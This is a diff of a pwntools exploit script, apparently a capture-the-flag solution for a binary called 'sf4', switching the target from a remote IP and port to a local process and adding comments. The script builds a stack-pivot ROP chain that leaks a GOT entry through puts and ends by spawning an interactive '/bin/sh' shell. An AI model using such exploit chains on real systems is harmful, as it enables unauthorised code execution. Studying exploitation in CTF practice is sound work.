@@ -1,8 +1,6 @@
-#nc 132.226.232.51 31000
-
 from pwn import *
 
-p = remote("132.226.232.51", 31000)
+p = process("./sf4")
 
 read_got = 0x804a00c
 read_plt = 0x8048370
@@ -25,19 +23,20 @@ binsh = 0x804a014
 pay = b''
 pay += b'A'*0x28
 pay += p32(bss + 0x28)
-pay += p32(read_leave_return)
+pay += p32(read_leave_return) 
 p.send(pay)
 
 
 pay = b''
 pay += p32(bss + 0x128)
 pay += p32(puts_plt)
-pay += p32(pr)
+pay += p32(pr) 
 pay += p32(read_got)
 pay += p32(read_leave_return)
-pay += b"B" * (0x28 - len(pay))
-pay += p32(bss)
-pay += p32(leave_return)
+pay += b"B" * (0x28 - len(pay))  # buf
+
+pay += p32(bss)          # sfp
+pay += p32(leave_return) # ret
 p.send(pay)
 
 p.recvline()
@@ -70,3 +69,5 @@ pay += b"/bin/sh\x00"
 p.send(pay)
 
 p.interactive()
+
+
